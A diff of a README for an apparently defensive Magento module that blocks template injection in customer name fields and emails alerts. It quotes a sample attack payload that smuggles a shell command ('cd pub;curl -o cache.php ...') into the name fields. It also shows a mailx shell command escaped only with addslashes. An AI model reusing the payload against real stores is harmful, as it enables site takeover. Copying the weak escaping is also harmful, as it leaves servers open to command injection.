@@ -5,7 +5,9 @@ and fake orders wtih first and last name like:
 
       {{var this.getTemp lateFil ter().filt er(order)}} {{var this.getTemp lateFil ter().add AfterFil terCallb ack(system).Fil ter(cd${IFS%??}pub;curl${IFS%??}-o${IFS%??}cache.php${IFS....
 
-Characters like - **{, }, <, >, %**  will be rejected. Update or remove them if necessery:
+Implemented a limit of 30 characters only for the **firstname** and **lastname** fields.
+
+Characters like - **{, }, <, >, %** will be rejected from every field. Update or remove them if necessery:
 
       if (preg_match('/[{}<>%]/', $input)) {
 
@@ -13,6 +15,8 @@ Email notifications for each unsuccessful attempt.
 Set your email in these 4 files:
     **AddressSavePlugin.php, CreateAccountPlugin.php, CustomerSavePlugin.php, OrderSourceLogger.php**
     
+and ensure that **mailx** is installed and configured correctly on your server.
+
 If you don't want to receive notifications -> comment:
 
         $command = 'echo "' . addslashes($message) . '" | mailx -s "Unsuccessful attempt" your@email.com';
